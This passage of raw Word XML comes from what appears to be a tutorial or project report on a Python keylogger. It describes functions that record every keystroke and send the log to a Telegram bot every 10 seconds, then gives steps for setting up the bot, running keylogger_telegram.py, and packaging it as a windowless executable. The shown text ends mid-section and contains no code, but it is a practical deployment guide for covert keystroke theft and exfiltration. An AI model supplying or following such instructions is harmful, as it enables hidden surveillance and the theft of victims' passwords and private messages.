              <w:t>BOT_TOKEN &amp; CHAT_ID</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="08A0DF17" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Replace with your own bot token and chat ID.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="02908A8C" w14:textId="77777777">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="43D8C9C3" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>log</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6EC1240A" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>A global string storing all captured keystrokes temporarily.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="0D30F69C" w14:textId="77777777">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7E1FDA86" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>send_telegram_message</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="270F3354" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Sends a text message to the Telegram bot chat.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="5C670659" w14:textId="77777777">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2A717106" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>callback()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5D09CF6A" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t xml:space="preserve">Called every time a key is pressed. Adds the key to log. Detects </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>exitlog</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="760C9E96" w14:textId="77777777">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="776B734C" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>report()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="70332B2F" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Runs every 10 seconds, sends log to Telegram, clears it, schedules itself again.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="21C1711E" w14:textId="77777777">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5D2CCBB7" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>keyboard_listener</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1A9002A0" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>A listener object that stays active to capture keystrokes.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="56AE5B5C" w14:textId="77777777">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="151D6032" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>keyboard_listener.join</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="23001EE7" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Keeps program running indefinitely.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="79F3B149" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:pict w14:anchorId="7B17B7B1">
          <v:rect id="_x0000_i1441" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="14E527B2" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>4.4 Setting up Telegram Bot</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="363099FA" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="59"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">Create a bot using </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>BotFather</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="018FDC26" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="59"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Open Telegram.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06FD467F" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="59"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Search for “</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>BotFather</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>.”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D861B74" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="59"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Type /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>newbot</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> and follow prompts to name your bot.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CD801A6" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="59"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>BotFather</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> gives you a </w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>bot token</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65C430FE" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="59"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Get your chat ID:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32986B7F" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="59"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Start a chat with your bot.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C60BE35" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="59"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Visit https://api.telegram.org/bot&lt;YOUR_BOT_TOKEN&gt;/getUpdates in your browser.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="466DAD47" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="59"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Look for "chat":{"id":</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>xxxxx</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>} — this is your chat ID.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="789D5535" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="59"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Replace BOT_TOKEN and CHAT_ID in your Python code.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46DAB8FB" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:pict w14:anchorId="57EEF451">
          <v:rect id="_x0000_i1442" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FF75039" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>4.5 Running the Program</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DCD68C8" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="60"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Save the Python file (example: keylogger_telegram.py).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C39A4D6" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="60"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Open a terminal or command prompt in the same directory.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A7579F6" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="60"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Run:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47D4B280" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="60"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>python keylogger_telegram.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45D0B410" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="60"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>The script starts capturing keys.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7298A24D" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="60"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Every 10 seconds you’ll see logs arriving in your Telegram bot chat.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="649751AA" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="60"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">To exit, type </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>exitlog</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> anywhere — program stops safely.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C24E3F7" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:pict w14:anchorId="051F9A60">
          <v:rect id="_x0000_i1443" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E4A4236" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>4.6 Converting to an Executable (Optional)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11DAF666" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>If you want the program to run as a standalone .exe without showing a console window:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="182B664C" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="61"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">Install </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>PyInstaller</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="540030C6" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="61"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">pip install </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>pyinstaller</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="265BFA7E" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="61"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Place an .</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
